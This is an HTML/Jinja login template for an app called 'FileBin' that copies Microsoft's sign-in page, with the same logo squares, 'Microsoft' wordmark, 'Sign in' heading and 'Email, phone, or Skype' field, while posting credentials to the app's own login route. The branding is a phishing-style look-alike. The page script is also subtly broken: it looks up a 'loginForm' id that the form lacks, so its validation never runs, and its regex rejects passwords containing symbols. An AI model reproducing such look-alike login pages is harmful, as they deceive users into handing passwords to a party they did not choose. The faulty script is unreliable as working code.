<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - FileBin</title>
    <style>
        /* Microsoft Login Page Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5c7c7 0%, #e8f5e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 440px;
        }

        .card {
            background: #ffffff;
            border: 1px solid #e1e1e1;
            border-radius: 2px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            padding: 44px 44px 36px 44px;
            text-align: left;
        }

        .microsoft-logo {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
        }

        .logo-squares {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: 1fr 1fr;
            gap: 1px;
            width: 21px;
            height: 21px;
            margin-right: 10px;
        }

        .logo-square {
            width: 10px;
            height: 10px;
        }

        .logo-square.red { 
            background-color: #f25022; 
        }

        .logo-square.green { 
            background-color: #7fba00; 
        }

        .logo-square.blue { 
            background-color: #00a4ef; 
        }

        .logo-square.yellow { 
            background-color: #ffb900; 
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #5e5e5e;
            letter-spacing: -0.5px;
        }

        h2 {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 16px;
            line-height: 28px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 8px 12px;
            font-size: 15px;
            line-height: 20px;
            border: 1px solid #605e5c;
            background-color: #ffffff;
            color: #323130;
            outline: none;
            transition: border-color 0.1s ease-in-out;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border: 2px solid #0078d4;
            padding: 7px 11px;
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #605e5c;
        }

        .next-button {
            width: 100%;
            background-color: #0078d4;
            color: #ffffff;
            border: 1px solid #0078d4;
            padding: 8px 12px;
            font-size: 15px;
            font-weight: 400;
            cursor: pointer;
            margin-top: 24px;
            transition: background-color 0.1s ease-in-out;
        }

        .next-button:hover {
            background-color: #106ebe;
            border-color: #106ebe;
        }

        .next-button:active {
            background-color: #005a9e;
            border-color: #005a9e;
        }

        .link-section {
            margin-top: 24px;
            font-size: 13px;
            line-height: 16px;
        }

        .link-section span {
            color: #323130;
        }

        .link-section a {
            color: #0078d4;
            text-decoration: none;
        }

        .link-section a:hover {
            text-decoration: underline;
        }

        .error {
            background-color: #fef7f7;
            border: 1px solid #d13438;
            color: #d13438;
            padding: 8px 12px;
            font-size: 13px;
            margin-bottom: 16px;
            border-radius: 2px;
        }

        /* Responsive adjustments */
        @media (max-width: 480px) {
            .card {
                padding: 24px 20px;
            }
            
            body {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="microsoft-logo">
                <div class="logo-squares">
                    <div class="logo-square red"></div>
                    <div class="logo-square green"></div>
                    <div class="logo-square blue"></div>
                    <div class="logo-square yellow"></div>
                </div>
                <span class="logo-text">Microsoft</span>
            </div>
            
            <h2>Sign in</h2>
            
            <!-- Error message placeholder -->
            {% if error %}
                <div class="error">{{ error }}</div>
            {% endif %}
            
            <form method="POST" action="{{ url_for('main.login', next=request.args.get('next')) }}">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Email, phone, or Skype" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="next-button">Next</button>
            </form>
            
            <div class="link-section">
                <span>No account? </span>
                <a href="{{ url_for('main.signup_page') }}">Create one!</a>
            </div>
        </div>
    </div>
     <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      const username = this.username.value;
      const password = this.password.value;
      const regex = /^[A-Za-z0-9]{4,}$/;

      if (!regex.test(username)) {
        alert("❌ Username must be at least 4 characters and contain only letters and digits.");
        e.preventDefault();
        return;
      }

      if (!regex.test(password)) {
        alert("❌ Password must be at least 4 characters and contain only letters and digits.");
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
